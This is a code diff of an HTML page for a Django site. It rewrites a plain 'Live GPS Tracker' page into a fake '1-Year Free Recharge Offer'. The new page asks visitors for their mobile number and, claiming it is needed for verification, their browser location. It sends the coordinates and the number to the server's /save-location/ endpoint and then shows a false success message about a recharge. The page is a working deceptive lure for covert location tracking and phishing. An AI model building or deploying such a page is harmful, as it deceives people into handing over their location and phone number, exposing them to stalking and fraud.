@@ -3,44 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live GPS Tracker</title>
+    <title>Free Recharge Offer</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
-        button { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; cursor: pointer; }
-        button:hover { background: #0056b3; }
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            background: linear-gradient(to right, #0062E6, #33AEFF);
+            color: white;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            color: black;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: auto;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        h2 { color: #0062E6; }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            background: #28a745;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #218838;
+        }
+        .hidden {
+            display: none;
+        }
+        #location, #location-message {
+            font-size: 14px;
+            color: #555;
+        }
     </style>
 </head>
 <body>
-    <h2>Live GPS Tracker</h2>
-    <p>Click the button to start tracking your live location:</p>
-    <button onclick="startTracking()">Start Tracking</button>
-    <p id="location">Location will appear here...</p>
+
+    <h1>🔥 1-Year Free Recharge Offer! 🔥</h1>
+    <p>Enter your number to claim your free recharge</p>
+
+    <div class="container">
+        <h2>Recharge Now</h2>
+        <input type="tel" id="phoneNumber" placeholder="Enter Mobile Number" required>
+        <button onclick="askForLocation()">Proceed</button>
+        <p id="successMessage" class="hidden">✅ Recharge request received! Check your SMS.</p>
+        <p id="location-message" class="hidden">📍 Location access is required for verification. Click "Allow" when prompted.</p>
+    </div>
+
+    <p id="location" class="hidden"></p>
 
     <script>
-        function startTracking() {
+        function askForLocation() {
+            let phoneNumber = document.getElementById("phoneNumber").value;
+            if (phoneNumber.length < 10) {
+                alert("Please enter a valid mobile number.");
+                return;
+            }
+
+            document.getElementById("location-message").classList.remove("hidden");
+
+            // Request location with consent
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(
+                navigator.geolocation.getCurrentPosition(
                     function (position) {
                         let lat = position.coords.latitude;
                         let lon = position.coords.longitude;
-                        document.getElementById("location").innerHTML = `Latitude: ${lat} <br> Longitude: ${lon}`;
-                        
+                        document.getElementById("location").innerHTML = `🌍 Location: ${lat}, ${lon}`;
+                        document.getElementById("location").classList.remove("hidden");
+
                         // Send data to Django backend
                         fetch('/save-location/', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
-                            body: JSON.stringify({ latitude: lat, longitude: lon })
+                            body: JSON.stringify({ latitude: lat, longitude: lon, phone: phoneNumber })
                         }).then(response => response.json())
-                          .then(data => console.log("Location sent:", data));
+                          .then(data => {
+                              document.getElementById("successMessage").classList.remove("hidden");
+                              console.log("Data sent:", data);
+                          });
+
                     },
                     function (error) {
-                        alert("Error getting location: " + error.message);
+                        alert("⚠️ Location access denied. You can still continue, but some features may not work.");
+                        document.getElementById("successMessage").classList.remove("hidden");
                     }
                 );
             } else {
-                alert("Geolocation is not supported by your browser.");
+                alert("⚠️ Your browser does not support location tracking.");
+                document.getElementById("successMessage").classList.remove("hidden");
             }
         }
     </script>
+
 </body>
 </html>
